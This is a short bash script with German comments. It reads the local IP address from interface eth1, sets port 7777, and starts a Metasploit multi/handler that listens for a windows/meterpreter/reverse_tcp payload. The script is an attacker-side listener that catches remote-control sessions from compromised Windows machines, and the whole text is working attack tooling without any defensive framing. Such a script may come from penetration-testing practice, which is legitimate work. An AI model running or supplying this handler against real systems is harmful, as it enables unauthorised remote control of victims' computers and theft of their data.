#!/bin/bash

# IP und Port als Variablen setzen
LHOST="$(ip addr show eth1 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)"
LPORT="7777"

msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set lhost $LHOST;
set lport $LPORT;
run;
"
